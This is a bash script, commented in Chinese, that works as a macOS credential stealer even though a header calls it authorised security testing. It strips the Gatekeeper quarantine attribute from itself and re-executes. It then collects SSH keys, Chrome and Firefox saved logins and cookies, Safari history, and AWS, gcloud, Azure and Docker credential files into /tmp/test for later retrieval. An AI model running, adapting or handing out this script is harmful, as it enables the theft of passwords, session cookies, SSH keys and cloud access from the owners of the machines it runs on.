#!/bin/bash
# -------------------------------------------------------------
# 脚本 1 - 解除 macOS 隔离并收集 SSH 密钥、浏览器凭证等
# 警告：仅用于授权安全测试
# -------------------------------------------------------------
set -e

TARGET="/tmp/test"
SCRIPT_PATH="$0"

echo "==================== 脚本开始 ===================="
echo "[*] 当前用户: $(whoami)"
echo "[*] 脚本路径: $SCRIPT_PATH"

# 1. 检测并移除隔离属性（绕过 Gatekeeper）
if xattr -p com.apple.quarantine "$SCRIPT_PATH" &>/dev/null; then
    echo "[!] 检测到 quarantine 属性，正在尝试移除..."
    xattr -d com.apple.quarantine "$SCRIPT_PATH" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] 移除成功，重新执行自身"
        exec "$SCRIPT_PATH" "$@"
    else
        echo "[-] 移除失败，请手动执行: xattr -d com.apple.quarantine $SCRIPT_PATH"
        exit 1
    fi
else
    echo "[+] 已无隔离属性，继续执行"
fi

# 2. 准备收集目录
echo "[*] 创建目标目录: $TARGET"
rm -rf "$TARGET" 2>/dev/null || true
mkdir -p "$TARGET"

# 3. 收集 SSH 密钥
echo "------------------------------------------------------"
echo "[*] 收集 SSH 密钥 (~/.ssh)"
if [ -d "$HOME/.ssh" ]; then
    cp -R "$HOME/.ssh" "$TARGET/ssh_backup"
    echo "[+] 已复制整个 ~/.ssh 目录"
    ls -la "$TARGET/ssh_backup"
else
    echo "[-] 未找到 ~/.ssh 目录，跳过"
fi

# 4. 收集 Google Chrome 凭证
echo "------------------------------------------------------"
echo "[*] 收集 Chrome/Chromium 浏览器数据"
CHROME_BASE="$HOME/Library/Application Support/Google/Chrome"
if [ -d "$CHROME_BASE" ]; then
    mkdir -p "$TARGET/chrome"
    # 遍历 Default 和所有 Profile 目录
    for profile_dir in "$CHROME_BASE"/Default "$CHROME_BASE"/Profile\ *; do
        if [ -d "$profile_dir" ]; then
            profile_name=$(basename "$profile_dir")
            mkdir -p "$TARGET/chrome/$profile_name"
            # 关键文件：Login Data (凭证), Cookies, Web Data (表单)
            for file in "Login Data" "Login Data For Account" "Cookies" "Cookies-journal" "Web Data" "Web Data-journal"; do
                if [ -f "$profile_dir/$file" ]; then
                    cp "$profile_dir/$file" "$TARGET/chrome/$profile_name/"
                    echo "[+] 已复制 Chrome/$profile_name/$file"
                fi
            done
        fi
    done
else
    echo "[-] 未安装 Chrome，跳过"
fi

# 5. 收集 Firefox 凭证
echo "------------------------------------------------------"
echo "[*] 收集 Firefox 浏览器数据"
FIREFOX_PROFILES="$HOME/Library/Application Support/Firefox/Profiles"
if [ -d "$FIREFOX_PROFILES" ]; then
    mkdir -p "$TARGET/firefox"
    for profile in "$FIREFOX_PROFILES"/*.default-release "$FIREFOX_PROFILES"/*.default; do
        if [ -d "$profile" ]; then
            profile_name=$(basename "$profile")
            mkdir -p "$TARGET/firefox/$profile_name"
            for file in "key4.db" "logins.json" "cert9.db" "cookies.sqlite"; do
                if [ -f "$profile/$file" ]; then
                    cp "$profile/$file" "$TARGET/firefox/$profile_name/"
                    echo "[+] 已复制 Firefox/$profile_name/$file"
                fi
            done
        fi
    done
else
    echo "[-] 未找到 Firefox 配置文件，跳过"
fi

# 6. 收集 Safari 历史/标签页（凭证在 Keychain 中，无法直接复制）
echo "------------------------------------------------------"
echo "[*] 收集 Safari 部分数据（密码需从 Keychain 提取，此处不包含）"
SAFARI_DIR="$HOME/Library/Safari"
if [ -d "$SAFARI_DIR" ]; then
    mkdir -p "$TARGET/safari"
    for file in "History.db" "LastSession.plist" "CloudTabs.db" "Bookmarks.plist"; do
        if [ -f "$SAFARI_DIR/$file" ]; then
            cp "$SAFARI_DIR/$file" "$TARGET/safari/"
            echo "[+] 已复制 Safari/$file"
        fi
    done
else
    echo "[-] 未找到 Safari 数据，跳过"
fi

# 7. 收集常见云服务凭证文件
echo "------------------------------------------------------"
echo "[*] 收集常见云服务配置文件"
declare -a CLOUD_FILES=(
    "$HOME/.aws/credentials"
    "$HOME/.aws/config"
    "$HOME/.config/gcloud/credentials.db"
    "$HOME/.config/gcloud/access_tokens.db"
    "$HOME/.azure/accessTokens.json"
    "$HOME/.docker/config.json"
)
for cf in "${CLOUD_FILES[@]}"; do
    if [ -f "$cf" ]; then
        dest="$TARGET/cloud$(dirname "${cf#$HOME}")"
        mkdir -p "$dest"
        cp "$cf" "$dest/"
        echo "[+] 已复制 $cf"
    fi
done

echo "==================== 收集完成 ===================="
echo "[+] 所有数据已保存至: $TARGET"
echo "[+] 请检查目录: ls -R $TARGET"